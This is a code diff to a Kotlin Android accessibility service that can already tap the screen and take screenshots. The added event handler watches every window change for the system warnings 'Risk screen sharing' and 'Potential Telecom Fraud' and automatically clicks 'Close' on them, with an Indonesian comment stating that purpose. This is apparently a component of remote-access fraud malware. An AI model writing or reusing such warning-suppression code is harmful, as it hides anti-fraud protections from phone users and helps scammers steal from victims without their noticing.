@@ -20,6 +20,8 @@ class FastAccessibilityService : AccessibilityService() {
     companion object {
         var instance: FastAccessibilityService? = null
         private val screenshotExecutor = Executors.newSingleThreadExecutor()
+        @Volatile
+        private var lastDismissTime = 0L
 
         fun tap(x: Int, y: Int): Boolean {
             val service = instance ?: return false
@@ -213,7 +215,37 @@ class FastAccessibilityService : AccessibilityService() {
         instance = this
     }
 
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null) return
+        val type = event.eventType
+        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
+            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
+        ) return
+
+        val now = System.currentTimeMillis()
+        if (now - lastDismissTime < 120L) return
+
+        try {
+            val root = rootInActiveWindow ?: return
+
+            // Cek apakah di layar muncul teks peringatan "Risk screen sharing" atau "Potential Telecom Fraud"
+            val hasRiskWarning = !root.findAccessibilityNodeInfosByText("Risk screen sharing").isNullOrEmpty() ||
+                                 !root.findAccessibilityNodeInfosByText("Potential Telecom Fraud").isNullOrEmpty()
+
+            if (hasRiskWarning) {
+                val closeNodes = root.findAccessibilityNodeInfosByText("Close")
+                if (!closeNodes.isNullOrEmpty()) {
+                    for (node in closeNodes) {
+                        if (clickNodeOrParent(node)) {
+                            lastDismissTime = now
+                            return
+                        }
+                    }
+                }
+            }
+        } catch (_: Throwable) {
+        }
+    }
 
     override fun onInterrupt() {}
 
